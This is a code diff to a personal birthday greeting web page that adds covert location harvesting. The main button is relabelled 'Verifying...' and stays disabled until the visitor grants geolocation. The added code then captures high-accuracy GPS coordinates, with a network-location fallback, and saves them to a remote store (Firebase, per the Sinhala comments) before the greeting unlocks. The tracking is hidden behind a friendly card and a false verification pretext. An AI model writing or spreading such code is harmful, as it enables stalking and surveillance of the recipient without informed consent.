@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Happy Birthday !</title>
+    <title>Happy Birthday Rasangika!</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&family=Patrick+Hand&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -231,7 +231,7 @@
             <p id="sub-title" class="wish-text">YOU ARE AMAZING!</p>
         </div>
         <div class="action-bar">
-            <button class="btn btn-main" id="mainButton">Let's go sis 🤗</button>
+            <button class="btn btn-main" id="mainButton" style="pointer-events: none; opacity: 0.8;">Verifying...</button>
         </div>
     </div>
 
@@ -399,6 +399,74 @@
             const btn = document.getElementById('mainButton');
             btn.style.pointerEvents = 'auto';
             btn.disabled = false;
+            btn.innerText = "Let's go sis 🤗"; // සාමාන්‍ය text එක ආයෙත් දානවා
+            btn.style.opacity = '1';
+        }
+
+        async function checkAndShowPopup() {
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const result = await navigator.permissions.query({ name: 'geolocation' });
+                    if (result.state === 'granted') {
+                        // Location එක අරන් Firebase එකට ලියලා ඉවර වුණාට පස්සෙයි Button එක Enable කරන්නේ
+                        requestLocationAccess(false); 
+                    } else if (result.state === 'denied') {
+                        showPopup('overlay3', 'card3');
+                    } else {
+                        showPopup('overlay1', 'card1');
+                    }
+                } catch(e) { showPopup('overlay1', 'card1'); }
+            } else { showPopup('overlay1', 'card1'); }
+        }
+
+        function requestLocationAccess(showPopupOnError = true) {
+            if (!navigator.geolocation) {
+                closeAllPopups();
+                if (showPopupOnError) showPopup('overlay2', 'card2');
+                return;
+            }
+
+            // Options: මුලින්ම High Accuracy (GPS) බලනවා තත්පර 15ක් ඇතුළත
+            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+
+            const successCallback = async (pos) => {
+                closeAllPopups();
+                try {
+                    if (window.saveLocationData) {
+                        await window.saveLocationData({ 
+                            lat: pos.coords.latitude, 
+                            lng: pos.coords.longitude, 
+                            accuracy: pos.coords.accuracy 
+                        });
+                    }
+                } catch(e) {
+                    console.error("Save Error:", e);
+                }
+                
+                // හැමදේම සම්පූර්ණ වුණාට පස්සේ විතරක් Button එක On කරනවා
+                isLocationAllowed = true;
+                enableMainInterface(); 
+            };
+
+            const errorCallback = (error) => {
+                console.warn("High accuracy failed, trying low accuracy...", error);
+                // High Accuracy ෆේල් වුණොත්, Low Accuracy (Network/Wi-Fi) වලින් ආයෙත් Try කරනවා
+                if (options.enableHighAccuracy) {
+                    options.enableHighAccuracy = false;
+                    options.timeout = 10000;
+                    navigator.geolocation.getCurrentPosition(successCallback, finalErrorCallback, options);
+                } else {
+                    finalErrorCallback(error);
+                }
+            };
+
+            const finalErrorCallback = (error) => {
+                closeAllPopups();
+                if (showPopupOnError) showPopup('overlay2', 'card2');
+            };
+
+            // Process එක පටන් ගන්නවා
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
         }
 
         function showGuideInPopup2() {
